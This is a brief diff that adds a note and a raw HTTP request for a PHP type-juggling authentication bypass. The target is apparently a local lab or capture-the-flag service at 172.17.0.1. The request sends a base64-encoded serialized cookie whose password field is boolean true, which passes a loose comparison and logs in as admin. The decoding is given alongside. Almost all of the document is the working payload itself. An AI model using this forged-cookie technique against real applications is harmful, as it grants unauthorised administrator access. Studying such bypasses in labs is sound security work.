@@ -1,0 +1,5 @@
+# PHP type juggling authentication bypass. Cookie creds is base64(serialize({username:admin, password:true})). The boolean true (b:1;) bypasses loose == password comparison. Decode: YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ== = a:2:{s:8:username;s:5:admin;s:8:password;b:1;}
+
+GET /index.php HTTP/1.1
+Host: 172.17.0.1:52929
+Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==
